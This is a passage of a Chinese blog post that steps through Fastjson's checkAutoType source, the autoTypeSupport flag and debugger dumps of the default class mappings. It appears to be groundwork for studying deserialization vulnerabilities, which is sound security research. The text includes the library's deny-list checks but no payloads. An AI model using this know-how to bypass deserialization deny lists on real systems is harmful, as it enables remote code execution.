class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            String deny;</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                String accept;</span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">                    accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">                    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>断点打到这个方法上；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gJCG11"><img src="https://z3.ax1x.com/2021/05/08/gJCG11.png" alt="gJCG11.png"></a></p>
<p>其typeName是我们的class名字；走到下面的判断中拿autoTypeSupport来进行if判断，追溯下，发现其在字节码中的static块有调用；这个就很熟悉了，分析过Common Collections的都很理解字节码下的static是会被直接调用的；追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        String property = IOUtils.getStringProperty(<span class="string">&quot;fastjson.parser.deny&quot;</span>);</span><br><span class="line">        DENYS = splitItemsFormProperty(property);</span><br><span class="line">        property = IOUtils.getStringProperty(<span class="string">&quot;fastjson.parser.autoTypeSupport&quot;</span>);</span><br><span class="line">        AUTO_SUPPORT = <span class="string">&quot;true&quot;</span>.equals(property);</span><br><span class="line">        property = IOUtils.getStringProperty(<span class="string">&quot;fastjson.parser.autoTypeAccept&quot;</span>);</span><br><span class="line">        String[] items = splitItemsFormProperty(property);</span><br><span class="line">        <span class="keyword">if</span> (items == <span class="keyword">null</span>) &#123;</span><br><span class="line">            items = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AUTO_TYPE_ACCEPT_LIST = items;</span><br><span class="line">        global = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        awtError = <span class="keyword">false</span>;</span><br><span class="line">        jdk8Error = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看到AUTO_SUPPORT是否为true取决于equals方法；这里断点调试发现其默认为空，所以这里equals参数为空，所以直接最后拼接后返回false；导致AUTO_SUPPORT为false；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gJ8tJA"><img src="https://z3.ax1x.com/2021/05/08/gJ8tJA.png" alt="gJ8tJA.png"></a></p>
<p>但是在构造器中不难发现重要的字段是由其来进行控制的，所以在默认的状态下，fastjson的autotypesupport为false；官方的wiki也进行了相应的描述<code>https://github.com/alibaba/fastjson/wiki/enable_autotype</code>；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gJ82zq"><img src="https://z3.ax1x.com/2021/05/08/gJ82zq.png" alt="gJ82zq.png"></a></p>
<p>开启的方法之一也就是进行代码中设置，将其置为true；</p>
<p>所以先来分析下默认时候的状态下代码执行流程看看如何解析；因为为false；所以</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个if点直接卡死；然后去getClassFromMapping一下Mapping中的key；也就是在反序列化的时候的类；追溯下看看mapping中原本的类有哪些；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gJGRtH"><img src="https://z3.ax1x.com/2021/05/08/gJGRtH.png" alt="gJGRtH.png"></a></p>
<p>列出来：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123;ConcurrentHashMap@<span class="number">579</span>&#125;  size = <span class="number">86</span></span><br><span class="line"> <span class="string">&quot;java.awt.Color&quot;</span> -&gt; &#123;Class@<span class="number">695</span>&#125; <span class="string">&quot;class java.awt.Color&quot;</span></span><br><span class="line"> <span class="string">&quot;[char&quot;</span> -&gt; &#123;Class@<span class="number">329</span>&#125; <span class="string">&quot;class [C&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalStateException&quot;</span> -&gt; &#123;Class@<span class="number">698</span>&#125; <span class="string">&quot;class java.lang.IllegalStateException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IndexOutOfBoundsException&quot;</span> -&gt; &#123;Class@<span class="number">700</span>&#125; <span class="string">&quot;class java.lang.IndexOutOfBoundsException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.sql.Time&quot;</span> -&gt; &#123;Class@<span class="number">702</span>&#125; <span class="string">&quot;class java.sql.Time&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NoSuchMethodException&quot;</span> -&gt; &#123;Class@<span class="number">704</span>&#125; <span class="string">&quot;class java.lang.NoSuchMethodException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.Collections$EmptyMap&quot;</span> -&gt; &#123;Class@<span class="number">176</span>&#125; <span class="string">&quot;class java.util.Collections$EmptyMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.Date&quot;</span> -&gt; &#123;Class@<span class="number">707</span>&#125; <span class="string">&quot;class java.util.Date&quot;</span></span><br><span class="line"> <span class="string">&quot;java.awt.Point&quot;</span> -&gt; &#123;Class@<span class="number">709</span>&#125; <span class="string">&quot;class java.awt.Point&quot;</span></span><br><span class="line"> <span class="string">&quot;[boolean&quot;</span> -&gt; &#123;Class@<span class="number">330</span>&#125; <span class="string">&quot;class [Z&quot;</span></span><br><span class="line"> <span class="string">&quot;float&quot;</span> -&gt; &#123;Class@<span class="number">712</span>&#125; <span class="string">&quot;float&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.AutoCloseable&quot;</span> -&gt; &#123;Class@<span class="number">270</span>&#125; <span class="string">&quot;interface java.lang.AutoCloseable&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NullPointerException&quot;</span> -&gt; &#123;Class@<span class="number">243</span>&#125; <span class="string">&quot;class java.lang.NullPointerException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NoSuchFieldError&quot;</span> -&gt; &#123;Class@<span class="number">716</span>&#125; <span class="string">&quot;class java.lang.NoSuchFieldError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NoSuchFieldException&quot;</span> -&gt; &#123;Class@<span class="number">718</span>&#125; <span class="string">&quot;class java.lang.NoSuchFieldException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.atomic.AtomicInteger&quot;</span> -&gt; &#123;Class@<span class="number">185</span>&#125; <span class="string">&quot;class java.util.concurrent.atomic.AtomicInteger&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.Locale&quot;</span> -&gt; &#123;Class@<span class="number">37</span>&#125; <span class="string">&quot;class java.util.Locale&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.InstantiationException&quot;</span> -&gt; &#123;Class@<span class="number">722</span>&#125; <span class="string">&quot;class java.lang.InstantiationException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.InternalError&quot;</span> -&gt; &#123;Class@<span class="number">724</span>&#125; <span class="string">&quot;class java.lang.InternalError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.SecurityException&quot;</span> -&gt; &#123;Class@<span class="number">726</span>&#125; <span class="string">&quot;class java.lang.SecurityException&quot;</span></span><br><span class="line"> <span class="string">&quot;[int&quot;</span> -&gt; &#123;Class@<span class="number">324</span>&#125; <span class="string">&quot;class [I&quot;</span></span><br><span class="line"> <span class="string">&quot;[double&quot;</span> -&gt; &#123;Class@<span class="number">327</span>&#125; <span class="string">&quot;class [D&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.Cloneable&quot;</span> -&gt; &#123;Class@<span class="number">313</span>&#125; <span class="string">&quot;interface java.lang.Cloneable&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalAccessException&quot;</span> -&gt; &#123;Class@<span class="number">731</span>&#125; <span class="string">&quot;class java.lang.IllegalAccessException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.IdentityHashMap&quot;</span> -&gt; &#123;Class@<span class="number">552</span>&#125; <span class="string">&quot;class java.util.IdentityHashMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.LinkageError&quot;</span> -&gt; &#123;Class@<span class="number">303</span>&#125; <span class="string">&quot;class java.lang.LinkageError&quot;</span></span><br><span class="line"> <span class="string">&quot;byte&quot;</span> -&gt; &#123;Class@<span class="number">735</span>&#125; <span class="string">&quot;byte&quot;</span></span><br><span class="line"> <span class="string">&quot;double&quot;</span> -&gt; &#123;Class@<span class="number">737</span>&#125; <span class="string">&quot;double&quot;</span></span><br><span class="line"> <span class="string">&quot;java.awt.Font&quot;</span> -&gt; &#123;Class@<span class="number">739</span>&#125; <span class="string">&quot;class java.awt.Font&quot;</span></span><br><span class="line"> <span class="string">&quot;java.sql.Timestamp&quot;</span> -&gt; &#123;Class@<span class="number">741</span>&#125; <span class="string">&quot;class java.sql.Timestamp&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span> -&gt; &#123;Class@<span class="number">33</span>&#125; <span class="string">&quot;class java.util.concurrent.ConcurrentHashMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.StringIndexOutOfBoundsException&quot;</span> -&gt; &#123;Class@<span class="number">744</span>&#125; <span class="string">&quot;class java.lang.StringIndexOutOfBoundsException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.UUID&quot;</span> -&gt; &#123;Class@<span class="number">746</span>&#125; <span class="string">&quot;class java.util.UUID&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.Exception&quot;</span> -&gt; &#123;Class@<span class="number">308</span>&#125; <span class="string">&quot;class java.lang.Exception&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalAccessError&quot;</span> -&gt; &#123;Class@<span class="number">749</span>&#125; <span class="string">&quot;class java.lang.IllegalAccessError&quot;</span></span><br><span class="line"> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span> -&gt; &#123;Class@<span class="number">563</span>&#125; <span class="string">&quot;class com.alibaba.fastjson.JSONObject&quot;</span></span><br><span class="line"> <span class="string">&quot;java.awt.Rectangle&quot;</span> -&gt; &#123;Class@<span class="number">752</span>&#125; <span class="string">&quot;class java.awt.Rectangle&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.StackOverflowError&quot;</span> -&gt; &#123;Class@<span class="number">298</span>&#125; <span class="string">&quot;class java.lang.StackOverflowError&quot;</span></span><br><span class="line"> <span class="string">&quot;[B&quot;</span> -&gt; &#123;Class@<span class="number">326</span>&#125; <span class="string">&quot;class [B&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.TypeNotPresentException&quot;</span> -&gt; &#123;Class@<span class="number">756</span>&#125; <span class="string">&quot;class java.lang.TypeNotPresentException&quot;</span></span><br><span class="line"> <span class="string">&quot;[C&quot;</span> -&gt; &#123;Class@<span class="number">329</span>&#125; <span class="string">&quot;class [C&quot;</span></span><br><span class="line"> <span class="string">&quot;[D&quot;</span> -&gt; &#123;Class@<span class="number">327</span>&#125; <span class="string">&quot;class [D&quot;</span></span><br><span class="line"> <span class="string">&quot;java.text.SimpleDateFormat&quot;</span> -&gt; &#123;Class@<span class="number">760</span>&#125; <span class="string">&quot;class java.text.SimpleDateFormat&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.HashMap&quot;</span> -&gt; &#123;Class@<span class="number">171</span>&#125; <span class="string">&quot;class java.util.HashMap&quot;</span></span><br><span class="line"> <span class="string">&quot;[F&quot;</span> -&gt; &#123;Class@<span class="number">328</span>&#125; <span class="string">&quot;class [F&quot;</span></span><br><span class="line"> <span class="string">&quot;long&quot;</span> -&gt; &#123;Class@<span class="number">764</span>&#125; <span class="string">&quot;long&quot;</span></span><br><span class="line"> <span class="string">&quot;[I&quot;</span> -&gt; &#123;Class@<span class="number">324</span>&#125; <span class="string">&quot;class [I&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.TreeSet&quot;</span> -&gt; &#123;Class@<span class="number">767</span>&#125; <span class="string">&quot;class java.util.TreeSet&quot;</span></span><br><span class="line"> <span class="string">&quot;[short&quot;</span> -&gt; &#123;Class@<span class="number">325</span>&#125; <span class="string">&quot;class [S&quot;</span></span><br><span class="line"> <span class="string">&quot;[J&quot;</span> -&gt; &#123;Class@<span class="number">323</span>&#125; <span class="string">&quot;class [J&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.VerifyError&quot;</span> -&gt; &#123;Class@<span class="number">771</span>&#125; <span class="string">&quot;class java.lang.VerifyError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.LinkedHashMap&quot;</span> -&gt; &#123;Class@<span class="number">92</span>&#125; <span class="string">&quot;class java.util.LinkedHashMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.HashSet&quot;</span> -&gt; &#123;Class@<span class="number">7</span>&#125; <span class="string">&quot;class java.util.HashSet&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalMonitorStateException&quot;</span> -&gt; &#123;Class@<span class="number">297</span>&#125; <span class="string">&quot;class java.lang.IllegalMonitorStateException&quot;</span></span><br><span class="line"> <span class="string">&quot;[byte&quot;</span> -&gt; &#123;Class@<span class="number">326</span>&#125; <span class="string">&quot;class [B&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.Calendar&quot;</span> -&gt; &#123;Class@<span class="number">598</span>&#125; <span class="string">&quot;class java.util.Calendar&quot;</span></span><br><span class="line"> <span class="string">&quot;[S&quot;</span> -&gt; &#123;Class@<span class="number">325</span>&#125; <span class="string">&quot;class [S&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.StackTraceElement&quot;</span> -&gt; &#123;Class@<span class="number">779</span>&#125; <span class="string">&quot;class java.lang.StackTraceElement&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NoClassDefFoundError&quot;</span> -&gt; &#123;Class@<span class="number">781</span>&#125; <span class="string">&quot;class java.lang.NoClassDefFoundError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.Hashtable&quot;</span> -&gt; &#123;Class@<span class="number">285</span>&#125; <span class="string">&quot;class java.util.Hashtable&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.WeakHashMap&quot;</span> -&gt; &#123;Class@<span class="number">162</span>&#125; <span class="string">&quot;class java.util.WeakHashMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.LinkedHashSet&quot;</span> -&gt; &#123;Class@<span class="number">785</span>&#125; <span class="string">&quot;class java.util.LinkedHashSet&quot;</span></span><br><span class="line"> <span class="string">&quot;[Z&quot;</span> -&gt; &#123;Class@<span class="number">330</span>&#125; <span class="string">&quot;class [Z&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NegativeArraySizeException&quot;</span> -&gt; &#123;Class@<span class="number">788</span>&#125; <span class="string">&quot;class java.lang.NegativeArraySizeException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalThreadStateException&quot;</span> -&gt; &#123;Class@<span class="number">790</span>&#125; <span class="string">&quot;class java.lang.IllegalThreadStateException&quot;</span></span><br><span class="line"> <span class="string">&quot;[long&quot;</span> -&gt; &#123;Class@<span class="number">323</span>&#125; <span class="string">&quot;class [J&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NoSuchMethodError&quot;</span> -&gt; &#123;Class@<span class="number">183</span>&#125; <span class="string">&quot;class java.lang.NoSuchMethodError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.NumberFormatException&quot;</span> -&gt; &#123;Class@<span class="number">794</span>&#125; <span class="string">&quot;class java.lang.NumberFormatException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.RuntimeException&quot;</span> -&gt; &#123;Class@<span class="number">307</span>&#125; <span class="string">&quot;class java.lang.RuntimeException&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.IllegalArgumentException&quot;</span> -&gt; &#123;Class@<span class="number">70</span>&#125; <span class="string">&quot;class java.lang.IllegalArgumentException&quot;</span></span><br><span class="line"> <span class="string">&quot;int&quot;</span> -&gt; &#123;Class@<span class="number">798</span>&#125; <span class="string">&quot;int&quot;</span></span><br><span class="line"> <span class="string">&quot;java.sql.Date&quot;</span> -&gt; &#123;Class@<span class="number">800</span>&#125; <span class="string">&quot;class java.sql.Date&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.TimeUnit&quot;</span> -&gt; &#123;Class@<span class="number">802</span>&#125; <span class="string">&quot;class java.util.concurrent.TimeUnit&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.atomic.AtomicLong&quot;</span> -&gt; &#123;Class@<span class="number">466</span>&#125; <span class="string">&quot;class java.util.concurrent.atomic.AtomicLong&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span> -&gt; &#123;Class@<span class="number">805</span>&#125; <span class="string">&quot;class java.util.concurrent.ConcurrentSkipListMap&quot;</span></span><br><span class="line"> <span class="string">&quot;boolean&quot;</span> -&gt; &#123;Class@<span class="number">807</span>&#125; <span class="string">&quot;boolean&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.concurrent.ConcurrentSkipListSet&quot;</span> -&gt; &#123;Class@<span class="number">809</span>&#125; <span class="string">&quot;class java.util.concurrent.ConcurrentSkipListSet&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.TreeMap&quot;</span> -&gt; &#123;Class@<span class="number">811</span>&#125; <span class="string">&quot;class java.util.TreeMap&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.InstantiationError&quot;</span> -&gt; &#123;Class@<span class="number">813</span>&#125; <span class="string">&quot;class java.lang.InstantiationError&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.InterruptedException&quot;</span> -&gt; &#123;Class@<span class="number">815</span>&#125; <span class="string">&quot;class java.lang.InterruptedException&quot;</span></span><br><span class="line"> <span class="string">&quot;[float&quot;</span> -&gt; &#123;Class@<span class="number">328</span>&#125; <span class="string">&quot;class [F&quot;</span></span><br><span class="line"> <span class="string">&quot;char&quot;</span> -&gt; &#123;Class@<span class="number">818</span>&#125; <span class="string">&quot;char&quot;</span></span><br><span class="line"> <span class="string">&quot;short&quot;</span> -&gt; &#123;Class@<span class="number">820</span>&#125; <span class="string">&quot;short&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.Object&quot;</span> -&gt; &#123;Class@<span class="number">322</span>&#125; <span class="string">&quot;class java.lang.Object&quot;</span></span><br><span class="line"> <span class="string">&quot;java.util.BitSet&quot;</span> -&gt; &#123;Class@<span class="number">38</span>&#125; <span class="string">&quot;class java.util.BitSet&quot;</span></span><br><span class="line"> <span class="string">&quot;java.lang.OutOfMemoryError&quot;</span> -&gt; &#123;Class@<span class="number">299</span>&#125; <span class="string">&quot;class java.lang.OutOfMemoryError&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里显然没有我们需要反序列化的目标类；所以直接返回为空；返回为空之后去走向：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>去到IdentityHashMap的类池中进行find；显然也是没有的；列出其部分后续put的默认的类池：identityHashMap类池是以buckets为基，buckets内部为key和value，以此形成一个单向链表内存缓冲区；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Timestamp.class, SqlDateDeserializer.instance_timestamp);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Date.class, SqlDateDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Time.class, TimeDeserializer.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(java.util.Date.class, DateCodec.instance);</span><br><span class="line"><span class="keyword">this</span>.deserializers.put(Calendar.class, 